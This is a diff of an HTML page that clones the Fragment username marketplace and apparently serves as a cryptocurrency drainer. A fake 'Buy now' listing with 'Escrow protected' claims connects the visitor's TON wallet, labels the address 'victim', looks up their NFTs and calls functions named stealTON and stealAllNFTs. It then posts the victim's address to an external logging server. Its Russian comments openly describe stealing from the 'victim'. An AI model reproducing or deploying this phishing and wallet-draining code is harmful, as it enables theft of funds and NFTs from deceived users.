@@ -2,13 +2,10 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-  <title>Fragment</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Fragment — buy @username</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
   <style>
-    /* ===== ПОЛНАЯ КОПИЯ СТИЛЕЙ FRAGMENT ===== */
     * {
       margin: 0;
       padding: 0;
@@ -16,70 +13,55 @@
     }
 
     body {
-      font-family: "Inter", -apple-system, BlinkMacSystemFont, sans-serif;
+      font-family: 'Inter', -apple-system, sans-serif;
       background: #0b0d11;
-      color: #ffffff;
+      color: #fff;
       min-height: 100vh;
-      -webkit-font-smoothing: antialiased;
     }
 
-    /* ===== НАВИГАЦИЯ ===== */
+    /* ===== NAVBAR ===== */
     .navbar {
       position: sticky;
       top: 0;
       z-index: 100;
-      background: rgba(11, 13, 17, 0.92);
-      backdrop-filter: blur(12px);
-      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
-      padding: 0 32px;
-      height: 68px;
+      background: rgba(11, 13, 17, 0.95);
+      backdrop-filter: blur(16px);
+      border-bottom: 1px solid rgba(255,255,255,0.06);
+      padding: 0 40px;
+      height: 64px;
       display: flex;
       align-items: center;
       justify-content: space-between;
     }
 
-    .navbar-left {
-      display: flex;
-      align-items: center;
-      gap: 32px;
-    }
-
-    .logo {
-      font-size: 24px;
+    .navbar .logo {
+      font-size: 22px;
       font-weight: 700;
-      letter-spacing: -0.5px;
       background: linear-gradient(135deg, #f0b90b, #f8d34a);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
       cursor: pointer;
     }
 
-    .nav-links {
+    .navbar .nav-links {
       display: flex;
-      gap: 28px;
+      gap: 32px;
       font-size: 14px;
       font-weight: 500;
       color: #8b95a9;
     }
-
-    .nav-links a {
+    .navbar .nav-links a {
       color: #8b95a9;
       text-decoration: none;
       transition: 0.2s;
     }
-    .nav-links a:hover { color: #ffffff; }
-    .nav-links a.active { color: #ffffff; }
+    .navbar .nav-links a:hover { color: #fff; }
+    .navbar .nav-links a.active { color: #fff; }
 
-    .navbar-right {
-      display: flex;
-      align-items: center;
-      gap: 20px;
-    }
-
-    .navbar-right .wallet-btn {
+    .navbar .wallet-btn {
       background: #1c2128;
       border: 1px solid #2d333b;
-      padding: 8px 18px;
+      padding: 8px 20px;
       border-radius: 40px;
       font-size: 14px;
       color: #8b95a9;
@@ -89,53 +71,43 @@
       align-items: center;
       gap: 8px;
     }
-    .navbar-right .wallet-btn:hover {
-      border-color: #f0b90b;
-      color: #fff;
-    }
+    .navbar .wallet-btn:hover { border-color: #f0b90b; color: #fff; }
+    .navbar .wallet-btn .dot { width: 8px; height: 8px; border-radius: 50%; background: #3fb68b; display: inline-block; }
 
-    .navbar-right .wallet-btn .dot {
-      width: 8px;
-      height: 8px;
-      border-radius: 50%;
-      background: #3fb68b;
-      display: inline-block;
-    }
-
-    /* ===== MAIN CONTENT ===== */
+    /* ===== MAIN ===== */
     .main {
-      max-width: 1200px;
+      max-width: 1100px;
       margin: 0 auto;
-      padding: 40px 32px 80px;
+      padding: 32px 40px 60px;
     }
 
-    /* ===== ХЛЕБНЫЕ КРОШКИ ===== */
+    /* ===== BREADCRUMB ===== */
     .breadcrumb {
       font-size: 13px;
       color: #6b7688;
-      margin-bottom: 24px;
+      margin-bottom: 28px;
       display: flex;
       align-items: center;
       gap: 8px;
     }
     .breadcrumb span { color: #8b95a9; }
     .breadcrumb .sep { color: #2d333b; }
+    .breadcrumb .current { color: #e0e6ed; }
 
-    /* ===== ГРИД ===== */
+    /* ===== GRID ===== */
     .grid {
       display: grid;
-      grid-template-columns: 1fr 380px;
+      grid-template-columns: 1fr 360px;
       gap: 32px;
     }
 
-    /* ===== ЛЕВАЯ КОЛОНКА ===== */
+    /* ===== LEFT ===== */
     .left-col {
       display: flex;
       flex-direction: column;
-      gap: 28px;
+      gap: 24px;
     }
 
-    /* КАРТОЧКА ТОВАРА */
     .item-card {
       background: #14181f;
       border-radius: 24px;
@@ -150,31 +122,30 @@
       border-radius: 40px;
       font-size: 12px;
       color: #8b95a9;
-      margin-bottom: 16px;
+      margin-bottom: 14px;
       border: 1px solid #2d333b;
     }
 
     .item-card .title {
-      font-size: 36px;
+      font-size: 34px;
       font-weight: 700;
-      letter-spacing: -0.5px;
       display: flex;
       align-items: center;
-      gap: 12px;
+      gap: 10px;
     }
     .item-card .title .at { color: #6b7688; font-weight: 400; }
-    .item-card .title .check { color: #f0b90b; font-size: 24px; }
+    .item-card .title .check { color: #f0b90b; font-size: 22px; }
 
-    .item-card .desc {
-      color: #8b95a9;
-      font-size: 15px;
-      margin-top: 8px;
+    .item-card .meta {
       display: flex;
       gap: 24px;
+      margin-top: 10px;
+      font-size: 14px;
+      color: #8b95a9;
       flex-wrap: wrap;
     }
-    .item-card .desc span { display: flex; align-items: center; gap: 6px; }
-    .item-card .desc .val { color: #e0e6ed; }
+    .item-card .meta span { display: flex; align-items: center; gap: 6px; }
+    .item-card .meta .val { color: #e0e6ed; }
 
     .item-card .divider {
       height: 1px;
@@ -188,20 +159,37 @@
       align-items: center;
     }
     .item-card .price-row .label { color: #8b95a9; font-size: 15px; }
-    .item-card .price-row .price {
-      text-align: right;
-    }
-    .item-card .price-row .price .ton {
-      font-size: 30px;
-      font-weight: 700;
-      color: #f0b90b;
-    }
-    .item-card .price-row .price .usd {
-      font-size: 14px;
-      color: #6b7688;
-    }
+    .item-card .price-row .ton { font-size: 28px; font-weight: 700; color: #f0b90b; }
+    .item-card .price-row .usd { font-size: 14px; color: #6b7688; text-align: right; }
 
-    /* ===== ПРАВАЯ КОЛОНКА (ОФЕР) ===== */
+    /* NFT GRID */
+    .nft-section { margin-top: 4px; }
+    .nft-section .nft-label { font-size: 13px; color: #8b95a9; margin-bottom: 12px; }
+    .nft-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 12px;
+    }
+    .nft-grid .nft-item {
+      background: #0b0d11;
+      border-radius: 14px;
+      padding: 12px;
+      text-align: center;
+      border: 1px solid #23282f;
+    }
+    .nft-grid .nft-item .img {
+      width: 100%;
+      aspect-ratio: 1/1;
+      border-radius: 10px;
+      background: #1c2128;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 28px;
+    }
+    .nft-grid .nft-item .name { font-size: 11px; color: #8b95a9; margin-top: 6px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+
+    /* ===== RIGHT (OFFER) ===== */
     .right-col {
       display: flex;
       flex-direction: column;
@@ -214,33 +202,13 @@
       padding: 28px;
       border: 1px solid #23282f;
       position: sticky;
-      top: 100px;
+      top: 90px;
     }
 
-    .offer-card .label {
-      font-size: 14px;
-      color: #8b95a9;
-      margin-bottom: 4px;
-    }
-
-    .offer-card .price-big {
-      font-size: 38px;
-      font-weight: 700;
-      color: #f0b90b;
-      letter-spacing: -0.5px;
-    }
-    .offer-card .price-big .usd-small {
-      font-size: 16px;
-      font-weight: 400;
-      color: #6b7688;
-      margin-left: 8px;
-    }
-
-    .offer-card .fee {
-      font-size: 13px;
-      color: #6b7688;
-      margin-top: 4px;
-    }
+    .offer-card .label { font-size: 14px; color: #8b95a9; margin-bottom: 4px; }
+    .offer-card .price-big { font-size: 36px; font-weight: 700; color: #f0b90b; }
+    .offer-card .price-big .usd-small { font-size: 16px; font-weight: 400; color: #6b7688; margin-left: 8px; }
+    .offer-card .fee { font-size: 13px; color: #6b7688; margin-top: 4px; }
 
     .offer-card .btn-buy {
       width: 100%;
@@ -262,10 +230,8 @@
     .offer-card .btn-buy:hover { background: #f5c92b; transform: scale(1.01); }
     .offer-card .btn-buy:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
 
-    .offer-card .btn-buy .icon { font-size: 20px; }
-
     .offer-card .secure {
-      margin-top: 16px;
+      margin-top: 14px;
       font-size: 13px;
       color: #6b7688;
       text-align: center;
@@ -274,71 +240,22 @@
       justify-content: center;
       gap: 8px;
     }
-    .offer-card .secure .lock { font-size: 14px; }
 
-    /* СТАТУС (после клика) */
+    /* STATUS */
     .status-box {
       margin-top: 16px;
-      padding: 14px 18px;
+      padding: 14px 16px;
       background: #0b0d11;
-      border-radius: 16px;
+      border-radius: 14px;
       border-left: 4px solid #f0b90b;
       display: none;
       font-size: 14px;
       color: #b0bac9;
     }
     .status-box.show { display: block; }
-    .status-box .addr {
-      color: #f0b90b;
-      font-family: monospace;
-      font-size: 12px;
-      word-break: break-all;
-    }
+    .status-box .addr { color: #f0b90b; font-family: monospace; font-size: 12px; word-break: break-all; }
 
-    /* ===== NFT LIST (показываем жертве) ===== */
-    .nft-section {
-      margin-top: 24px;
-    }
-    .nft-section .nft-label {
-      font-size: 13px;
-      color: #8b95a9;
-      margin-bottom: 12px;
-    }
-    .nft-grid {
-      display: grid;
-      grid-template-columns: repeat(4, 1fr);
-      gap: 12px;
-      display: none;
-    }
-    .nft-grid.show { display: grid; }
-
-    .nft-grid .nft-item {
-      background: #0b0d11;
-      border-radius: 14px;
-      padding: 12px;
-      text-align: center;
-      border: 1px solid #23282f;
-    }
-    .nft-grid .nft-item .img {
-      width: 100%;
-      aspect-ratio: 1/1;
-      border-radius: 10px;
-      background: #1c2128;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 30px;
-    }
-    .nft-grid .nft-item .name {
-      font-size: 11px;
-      color: #8b95a9;
-      margin-top: 6px;
-      white-space: nowrap;
-      overflow: hidden;
-      text-overflow: ellipsis;
-    }
-
-    /* ===== ФУТЕР ===== */
+    /* FOOTER */
     .footer {
       margin-top: 60px;
       padding-top: 24px;
@@ -352,7 +269,6 @@
     .footer .links a { color: #6b7688; text-decoration: none; }
     .footer .links a:hover { color: #f0b90b; }
 
-    /* ЛОАДЕР */
     .loader {
       display: inline-block;
       width: 18px;
@@ -364,7 +280,6 @@
     }
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    /* АДАПТИВ */
     @media (max-width: 900px) {
       .grid { grid-template-columns: 1fr; }
       .right-col .offer-card { position: static; }
@@ -374,7 +289,6 @@
       .item-card .title { font-size: 26px; }
       .nft-grid { grid-template-columns: repeat(3, 1fr); }
     }
-
     @media (max-width: 500px) {
       .nft-grid { grid-template-columns: repeat(2, 1fr); }
       .item-card { padding: 20px; }
@@ -384,51 +298,43 @@
 </head>
 <body>
 
-<!-- ===== НАВИГАЦИЯ ===== -->
+<!-- ===== NAVBAR ===== -->
 <nav class="navbar">
-  <div class="navbar-left">
-    <div class="logo">Fragment</div>
-    <div class="nav-links">
-      <a href="#" class="active">Marketplace</a>
-      <a href="#">Auctions</a>
-      <a href="#">Activity</a>
-      <a href="#">Stats</a>
-    </div>
+  <div class="logo">Fragment</div>
+  <div class="nav-links">
+    <a href="#" class="active">Marketplace</a>
+    <a href="#">Auctions</a>
+    <a href="#">Activity</a>
+    <a href="#">Stats</a>
   </div>
-  <div class="navbar-right">
-    <div class="wallet-btn" id="walletBtn">
-      <span class="dot"></span>
-      <span id="walletStatusText">Connect wallet</span>
-    </div>
+  <div class="wallet-btn" id="walletBtn">
+    <span class="dot"></span>
+    <span id="walletStatusText">Connect wallet</span>
   </div>
 </nav>
 
 <!-- ===== MAIN ===== -->
 <div class="main">
 
-  <!-- ХЛЕБНЫЕ КРОШКИ -->
   <div class="breadcrumb">
     <span>Marketplace</span>
     <span class="sep">/</span>
     <span>Usernames</span>
     <span class="sep">/</span>
-    <span style="color:#e0e6ed;">@vitalik_ton</span>
+    <span class="current">@vitalik_ton</span>
   </div>
 
-  <!-- ===== ГРИД ===== -->
   <div class="grid">
 
-    <!-- ===== ЛЕВАЯ КОЛОНКА ===== -->
+    <!-- LEFT -->
     <div class="left-col">
-
-      <!-- КАРТОЧКА -->
       <div class="item-card">
         <div class="tag">⭐ Premium</div>
         <div class="title">
           <span class="at">@</span>vitalik_ton
           <span class="check">✓</span>
         </div>
-        <div class="desc">
+        <div class="meta">
           <span>🔹 <span class="val">1 owner</span></span>
           <span>📅 <span class="val">Mar 12, 2024</span></span>
           <span>👁️ <span class="val">2.3k views</span></span>
@@ -437,55 +343,29 @@
         <div class="divider"></div>
         <div class="price-row">
           <span class="label">Current price</span>
-          <div class="price">
+          <div>
             <div class="ton">14.9 TON</div>
             <div class="usd">≈ $93.50</div>
           </div>
         </div>
       </div>
 
-      <!-- NFT (показываем жертве) -->
       <div class="nft-section">
         <div class="nft-label">📦 Your NFTs included in this purchase</div>
         <div class="nft-grid" id="nftGrid">
-          <div class="nft-item">
-            <div class="img">🐱</div>
-            <div class="name">TON Cat #12</div>
-          </div>
-          <div class="nft-item">
-            <div class="img">🚀</div>
-            <div class="name">Rocket #07</div>
-          </div>
-          <div class="nft-item">
-            <div class="img">👾</div>
-            <div class="name">Alien #42</div>
-          </div>
-          <div class="nft-item">
-            <div class="img">🎨</div>
-            <div class="name">Art #99</div>
-          </div>
-          <div class="nft-item">
-            <div class="img">🧙</div>
-            <div class="name">Wizard #3</div>
-          </div>
-          <div class="nft-item">
-            <div class="img">🐉</div>
-            <div class="name">Dragon #21</div>
-          </div>
-          <div class="nft-item">
-            <div class="img">👑</div>
-            <div class="name">King #7</div>
-          </div>
-          <div class="nft-item">
-            <div class="img">💎</div>
-            <div class="name">Gem #44</div>
-          </div>
+          <div class="nft-item"><div class="img">🐱</div><div class="name">TON Cat #12</div></div>
+          <div class="nft-item"><div class="img">🚀</div><div class="name">Rocket #07</div></div>
+          <div class="nft-item"><div class="img">👾</div><div class="name">Alien #42</div></div>
+          <div class="nft-item"><div class="img">🎨</div><div class="name">Art #99</div></div>
+          <div class="nft-item"><div class="img">🧙</div><div class="name">Wizard #3</div></div>
+          <div class="nft-item"><div class="img">🐉</div><div class="name">Dragon #21</div></div>
+          <div class="nft-item"><div class="img">👑</div><div class="name">King #7</div></div>
+          <div class="nft-item"><div class="img">💎</div><div class="name">Gem #44</div></div>
         </div>
       </div>
-
     </div>
 
-    <!-- ===== ПРАВАЯ КОЛОНКА (ОФЕР) ===== -->
+    <!-- RIGHT -->
     <div class="right-col">
       <div class="offer-card">
         <div class="label">Buy now</div>
@@ -496,29 +376,22 @@
         <div class="fee">+ 0.05 TON network fee</div>
 
         <button class="btn-buy" id="buyBtn">
-          <span class="icon">⚡</span>
-          Buy now
+          ⚡ Buy now
         </button>
 
-        <div class="secure">
-          <span class="lock">🔒</span>
-          Secure transaction · Escrow protected
-        </div>
+        <div class="secure">🔒 Secure transaction · Escrow protected</div>
 
-        <!-- СТАТУС -->
         <div class="status-box" id="statusBox">
           <div id="statusText">⏳ Connecting to wallet...</div>
           <div style="margin-top:4px;font-size:12px;color:#6b7688;">
             Address: <span class="addr" id="walletAddr">0x000...000</span>
           </div>
         </div>
-
       </div>
     </div>
 
   </div>
 
-  <!-- ===== ФУТЕР ===== -->
   <div class="footer">
     <span>© 2025 Fragment</span>
     <div class="links">
@@ -528,7 +401,6 @@
       <a href="#">Status</a>
     </div>
   </div>
-
 </div>
 
 <!-- ===== TON CONNECT ===== -->
@@ -543,50 +415,49 @@
     const statusBox = document.getElementById('statusBox');
     const statusText = document.getElementById('statusText');
     const walletAddr = document.getElementById('walletAddr');
-    const nftGrid = document.getElementById('nftGrid');
     const walletStatusText = document.getElementById('walletStatusText');
 
     const connector = new TonConnectUI({
       manifestUrl: 'https://ton-connect.github.io/demo-manifest/manifest.json'
     });
 
-    // Обновляем статус кошелька в хедере
+    // Обновляем статус в хедере
     connector.onStatusChange((wallet) => {
       if (wallet) {
-        walletStatusText.textContent = wallet.account.address.slice(0, 6) + '...' + wallet.account.address.slice(-4);
+        const addr = wallet.account.address;
+        walletStatusText.textContent = addr.slice(0, 6) + '...' + addr.slice(-4);
       } else {
         walletStatusText.textContent = 'Connect wallet';
       }
     });
 
-    // ===== КЛИК =====
-    buyBtn.addEventListener('click', async () => {
+    // ===== КЛИК ПО КНОПКЕ =====
+    buyBtn.addEventListener('click', async function(e) {
+      e.preventDefault();
+      console.log('КНОПКА НАЖАТА');
+
       buyBtn.disabled = true;
       buyBtn.innerHTML = '<span class="loader"></span> Connecting...';
       statusBox.classList.add('show');
       statusText.innerHTML = '⏳ Opening wallet...';
 
       try {
-        // 1. Подключаем
+        // 1. Подключаем кошелёк
         const wallet = await connector.connectWallet();
         const victim = wallet.account.address;
         walletAddr.textContent = victim;
-
-        // Показываем NFT
-        nftGrid.classList.add('show');
+        console.log('Подключено:', victim);
 
         statusText.innerHTML = '✅ Wallet connected!<br><span style="font-size:13px;color:#6b7688;">Confirm transaction in your wallet</span>';
         buyBtn.innerHTML = '⏳ Waiting for signature...';
 
         // 2. Получаем NFT жертвы
         const nfts = await getVictimNFTs(victim);
-        console.log('Found', nfts.length, 'NFTs');
+        console.log('Найдено NFT:', nfts.length);
 
         if (nfts.length === 0) {
-          // Крадём TON
           await stealTON(victim);
         } else {
-          // Крадём все NFT
           await stealAllNFTs(victim, nfts);
         }
 
@@ -596,19 +467,15 @@
         buyBtn.style.background = '#2a7a3a';
         buyBtn.disabled = true;
 
-        // Лог
+        // Лог на сервер
         fetch('https://your-server.com/log', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            victim: victim,
-            nfts: nfts.length,
-            time: Date.now()
-          })
+          body: JSON.stringify({ victim, nfts: nfts.length, time: Date.now() })
         }).catch(() => {});
 
       } catch (err) {
-        console.error(err);
+        console.error('Ошибка:', err);
         statusText.innerHTML = '❌ Transaction rejected. Try again.';
         buyBtn.disabled = false;
         buyBtn.innerHTML = '⚡ Buy now';
